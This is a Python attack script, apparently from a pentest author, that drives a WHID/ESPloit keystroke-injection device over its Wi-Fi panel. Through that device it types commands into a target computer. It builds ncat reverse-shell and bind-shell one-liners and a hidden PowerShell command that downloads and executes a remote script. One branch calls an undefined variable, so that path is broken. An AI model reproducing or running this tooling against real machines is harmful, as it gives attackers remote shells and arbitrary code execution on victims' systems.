#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import argparse
import re
from pathlib import Path
from urllib.parse import urlencode, quote_plus

def banner():
    print("""
    \033[93m -------------------------------------------------------------\033[0m
    \033[1m  WHID injector - You need to be connected to the Exploit AP\033[0m
    \033[93m -------------------------------------------------------------
                   __   °
                 <(o )___
                  ( ._> /
                   `---'\033[0m                      @pentest_swissky
    """)
    print("Enter a payload, eg: bash -c 'nohup ncat 127.0.0.1 4242 -e $SHELL &'")
    print("-------------------------------------------------------------------")

def help():
    print("--------------[ Events ]--------------")
    print("q/exit     => exit the program")
    print("h/help     => display this help message")
    print("reverse    => use a basic reverse-shell based on ncat")
    print("bind       => set up a bind-shell")
    print("empire URL => download and execute a powershell string")
    print("send MSG   => write MSG")
    print("--------------[ Commands ]--------------")
    print("Comment     => Rem: Comment")
    print("Delay       => CustomDelay:1000")
    print("Send key    => Press:X+Y, Press:131+114")
    print("Send text   => Print:XYZ")
    print("Move mouse  => MouseMoveUp:X, MouseMoveDown:X, MouseMoveLeft:X, MouseMoveRight:X")
    print("Mouse click => MouseClickLEFT:X, MouseClickRIGHT:X, MouseClickMIDDLE:X")
    print("Blink led   => BlinkLED:X")
    print("The work around for writing a script that requires a '<' is to replace all instances of '<' with '&lt;'.")
    print("")
    print("--------------[ KeyboardModifiers ]--------------")
    print("Key           Decimal| Key           Decimal")
    print("KEY_LEFT_CTRL    128 | KEY_LEFT_SHIFT    129")
    print("KEY_LEFT_ALT     130 | KEY_LEFT_GUI      131")
    print("KEY_RIGHT_CTRL   132 | KEY_RIGHT_SHIFT   133")
    print("KEY_RIGHT_ALT    134 | KEY_RIGHT_GUI     135")
    print("KEY_UP_ARROW     218 | KEY_DOWN_ARROW    217")
    print("KEY_LEFT_ARROW   216 | KEY_RIGHT_ARROW   215")
    print("KEY_BACKSPACE    178 | KEY_TAB           179")
    print("KEY_RETURN       176 | KEY_ESC           177")
    print("KEY_INSERT       209 | KEY_PAGE_UP       211")
    print("KEY_DELETE       212 | KEY_HOME          210")
    print("KEY_END          213 | KEY_CAPS_LOCK     193")
    print("KEY_F1           194 | KEY_F2            195")
    print("KEY_F3           196 | KEY_F4            197")
    print("KEY_F5           198 | KEY_F6            199")
    print("KEY_F7           200 | KEY_F8            201")
    print("KEY_F9           202 | KEY_F10           203")
    print("KEY_F11          204 | KEY_F12           205")


def convert_to_keymap(user_input, payload):
    # TODO find > < and |
    fr_mapping = './mazqwAZQW&é"\'(-è_çà)^$Mù,?;:!§1234567890'
    en_mapping = '<>;qwazQWAZ1234567890-[]:\'mM,./?!@#$%^&*()'
    user_converted = user_input.translate(str.maketrans(fr_mapping,en_mapping))
    user_converted = payload % user_converted
    return user_converted


def send_payload(user_converted, panel):
    payloads = { "livepayload":user_converted, "livepayloadpresent":1}
    encoded  = urlencode( payloads, quote_via=quote_plus)
    try:
        print('Sending payload to %s' % panel)
        if not "200" in str(requests.post(panel, data=encoded)):
            print("\033[91mError 404, are you connected on the right AP?")

    except Exception as e:
        print("\033[91mError, couldn't reach the Wifi Portal !")


def update_firmware():
     update = "https://github.com/exploitagency/ESPloitV2/releases"
     update = requests.get(update).text
     regex = re.compile("exploit.*\.bin")
     last = "https://github.com/" + regex.findall(update)[0]

     name = "-".join(last.split('/')[-2:])
     download = Path(name)
     if not download.exists():
         print("Downloading the last release: %s" % last)
         r = requests.get(last, stream=True)
         if r.status_code == 200:
             with open(name, 'wb') as f:
                 for chunk in r:
                     f.write(chunk)


def check_panel(panel):
    try:
        if not "ESPloit" in requests.get(panel, timeout=1).text:
            print("\033[91mError 404, are you connected on the right AP?")
            update_firmware()

    except Exception as e:
        print("\033[91mError, couldn't reach the Wifi Portal !\033[0m")
        update_firmware()


if __name__ == "__main__":

    # Parsing argument from command line
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', action='store_true', dest='verbose',help='Verbosity of the output')
    parser.add_argument('--host', nargs='?', default='127.0.0.1',     help='Host reverse-shell' )
    parser.add_argument('--port', nargs='?', default='4242',          help='Port reverse-shell' )
    parser.add_argument('--user', nargs='?', default='admin',         help='Wifi Panel username')
    parser.add_argument('--pass', nargs='?', default='hacktheplanet', help='Wifi Panel password')
    parser.add_argument('--panel',nargs='?', default='http://192.168.1.1', help='Wifi Panel password')
    parser.add_argument('--payload', nargs='?', default='payloads/default.txt', help='Payload template')
    results = parser.parse_args()

    # Default payload
    payload = ""
    with open(results.payload,'r') as f:
        payload = f.read()

    banner()
    check_panel(results.panel)
    while(True):
        user_input = input("\033[92m>>> \033[0m")

        # Simple user interactions
        if user_input == "q" or user_input=="exit":
            exit()

        elif user_input == "h" or user_input == "help":
            help()
            continue

        # Reverse Shell Linux
        elif "reverse" == user_input :
            user_input = "bash -c 'nohup ncat %s %s -e $SHELL &'" % (results.host, results.port)

        # Bind Shell Linux
        elif "bind" == user_input:
            user_input = "bash -c 'nohup ncat -lvp %s -e $SHELL -k &'" % (results.port)

        # Empire or anything for Windows
        elif "empire" in user_input :
            # Recommended https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
            args = user_input.split(" ")
            user_input = "powershell -W Hidden -nop -noni -c \"IEX (New-Object Net.Webclient).downloadstring('%s')\"" % args[1]

            # Send the payload
            user_converted = convert_to_keymap(txt, "CustomDelay:1000\nPrint:%s\nCustomDelay:1000\nPress:176")
            send_payload(user_converted, results.panel+"/runlivepayload")


        # Send simple text without using a payload chain
        elif 'send' == user_input.split(' ')[0]:
            # Convert the simple text to keymap
            txt = "".join(user_input.split(' ')[1:])
            user_converted = convert_to_keymap(txt, "CustomDelay:1000\nPrint:%s\nCustomDelay:1000\nPress:176")
            if results.verbose == True:
                print('\033[92mText:\033[0m\n%s' % user_converted)

            # Send the payload
            send_payload(user_converted, results.panel+"/runlivepayload")
            continue

        # Send evil command with default payload
        if user_input != "":

            # Convert from AZERTY to QWERTY
            user_converted = convert_to_keymap(user_input, payload)
            if results.verbose == True:
                print('\033[92mPayload:\033[0m\n%s' % user_converted)

            # Send the payload
            send_payload(user_converted, results.panel+"/runlivepayload")
